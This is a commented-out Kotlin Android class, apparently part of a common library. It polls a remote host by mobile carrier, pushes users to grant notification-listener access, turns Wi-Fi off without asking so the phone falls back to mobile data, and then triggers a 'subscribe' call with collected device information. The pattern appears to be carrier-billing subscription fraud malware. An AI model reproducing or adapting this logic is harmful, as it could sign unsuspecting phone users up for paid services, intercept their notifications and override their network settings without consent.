//package com.mos.lib.common.persenter
//
//import android.annotation.SuppressLint
//import android.content.*
//import android.net.wifi.WifiManager
//import android.provider.Settings
//import android.text.TextUtils
//import com.alibaba.fastjson.JSON
//import com.blankj.utilcode.util.FlashlightUtils.destroy
//import com.blankj.utilcode.util.LogUtils
//import com.blankj.utilcode.util.NetworkUtils
//import com.cp.log.CheckBean
//import com.cp.log.Log4js
//import com.mos.lib.common.Report
//import com.mos.lib.common.interfaces.NetWorkListener
//import com.mos.lib.common.receiver.Re
//import com.mos.lib.common.util.NetUtil
//import com.mos.lib.common.util.NetUtil.operator
//import com.mos.lib.common.util.PermissionUtils
//import com.mos.lib.common.util.SharedUtil
//import com.mos.lib.common.util.StringUtil
//import com.orhanobut.logger.BuildConfig
//import kotlinx.coroutines.Dispatchers
//import kotlinx.coroutines.GlobalScope
//import kotlinx.coroutines.launch
//import kotlinx.coroutines.withContext
//import okhttp3.OkHttpClient
//import okhttp3.Request
//import okhttp3.Response
//
///**
//Date: 2019-12-07
//Time: 17:34
//Author: liuhao
// **/
//@SuppressLint("StaticFieldLeak")
//object PersenterCall : NetWorkListener {
//
//
//    private val client = OkHttpClient()
//    private const val ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners"
//    private var running = false
//    private var closeWifi = true
//    private var mContext: Context? = null
//    private var receiver: Re? = null
//    private var subContext: ContextCenter? = null
//
//
//    fun getCommand(context: Context, subContext: ContextCenter) {
//        this.subContext = subContext
//        this.mContext = context
//        GlobalScope.launch(Dispatchers.Main) {
//            var checkBean: CheckBean? = null
//            withContext(Dispatchers.IO) {
//                operator = if (StringUtil.isEmpty(operator)) NetUtil.operator else operator
//                var request = Request.Builder().url(AnyField.Companion.APP_CHECK_HOST + AnyField.Companion.APP_CHECK_OPERATOR + operator).build()
//                var response = client.newCall(request).execute()
//                if (response.isSuccessful) {
//                    val string = response.body()?.string()
//                    checkBean = JSON.parseObject(string, CheckBean::class.java)
//
//                }
//            }
//            if (checkBean?.code == 1) {
//                LogUtils.i("getCode == 1 return")
//            }
//            //result = 1 代表需要ping
//            if (checkBean?.result == 1) {
//                if (!isNotificationServiceEnabled(context)) {
//                    LogUtils.i("ping_show_dialog")
//                    if (!PermissionUtils.initDialog(context)!!.isShowing) {
//                        PermissionUtils.initDialog(context)!!.show()
//                        subContext.subCall.r.i("show_dialog")
//                    }
//                } else {
//                    //不需要授权
//                    subContext.subCall.r.i("ping_call")
//                    LogUtils.i("ping_call")
//                    getCommand(context, subContext)
//                }
//            } else {
//                LogUtils.i("click_call")
//                subContext.subCall.r.i("click_call")
//                Log4js.isPermission = true
////                call(context)
//                getCommand(context, subContext)
//            }
//            //-------------------------------------------
//
//
//            LogUtils.i("execute_call")
//            synchronized(ContextCenter::class.java) {
//                if (!Log4js.isPermission) {
//                    if (!isNotificationServiceEnabled(context)) {
//
////                        subContext.subCall.r.w("not_notification_permission")
//
//                        running = false
//
//                        return@launch
//                    }
//                }
//                if (!running && subContext.subCall != null) {
//
//                    running = true
//
//                    val success = SharedUtil.isSuccess
//
//                    LogUtils.i("sub_status", success)
//
//                    //是否订阅成功
//                    if (!success) {
//                        //                    int data = 1;
//                        //state = 0时，为带ping订阅
//                        LogUtils.w("ContextCenter")
//                        Thread(Runnable {
//                            try {
////                                subCall(context)
//
//                                val info = Report.report!!.info()
//
//                                if (!StringUtil.isEmpty(info)) {
//
//                                    //关闭wifi
//                                    if (wifiStateAndClose(context)) {
//                                        //调用 Ws 中sub方法
//                                        PersenterCall.subContext?.subCall?.sub(info!!)
//                                    }
//                                }
//
//                            } catch (e: Exception) {
//                                LogUtils.e(e)
//                            } finally {
//                                running = false
//                            }
//                        }).start()
//                    } else {
//                        running = false
//                    }
//                }
//            }
//
//        }
//    }
//
//    fun closeWifi(wifi: Boolean) {
//        closeWifi = wifi
//    }
//
//    private fun wifiStateAndClose(context: Context): Boolean {
//
//        if (closeWifi) {
//
//            val netCode = NetUtil.getNetworkState(context)
//
//            if (netCode == NetUtil.NETWORK_WIFI) {
//
//                LogUtils.i("start_close_wifi")
//                //注册广播
//                if (receiver == null) {
//
//                    receiver = Re(this)
//
//                    val filter = IntentFilter()
//
//                    filter.addAction("android.net.conn.CONNECTIVITY_CHANGE")
//                    filter.addAction("android.net.wifi.WIFI_STATE_CHANGED")
//                    filter.addAction("android.net.wifi.STATE_CHANGE")
//
//                    context.registerReceiver(receiver, filter)
//                }
//
//                val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
//
//                wifiManager.isWifiEnabled = false
//
//                return false
//            } else if (netCode == NetUtil.NETWORK_NONE) {
//                LogUtils.w("not_network")
//                return false
//            }
//        }
//
//        return true
//    }
//
//    private fun isNotificationServiceEnabled(context: Context): Boolean {
//        val pkgName = context.packageName
//        val flat = Settings.Secure.getString(context.contentResolver, ENABLED_NOTIFICATION_LISTENERS)
//
//        if (!TextUtils.isEmpty(flat)) {
//            val names = flat.split(":".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()
//
//            for (name in names) {
//                val cn = ComponentName.unflattenFromString(name)
//                if (cn != null) {
//                    if (TextUtils.equals(pkgName, cn.packageName)) {
//                        return true
//                    }
//                }
//            }
//        }
//        return false
//    }
//
//    override fun listenerNetwork(context: Context) {
//        subContext?.subCall?.report(AnyField.OPEN_4G_NETWORK)
//
////        subContext?.call(context)
//
////        subCall(context)
//
//        val info = Report.report!!.info()
//
//        if (!StringUtil.isEmpty(info)) {
//
//            //关闭wifi
//            if (wifiStateAndClose(context)) {
//                //调用 Ws 中sub方法
//                PersenterCall.subContext?.subCall?.sub(info!!)
//            }
//        }
//
////        destroy()
//    }
//
//}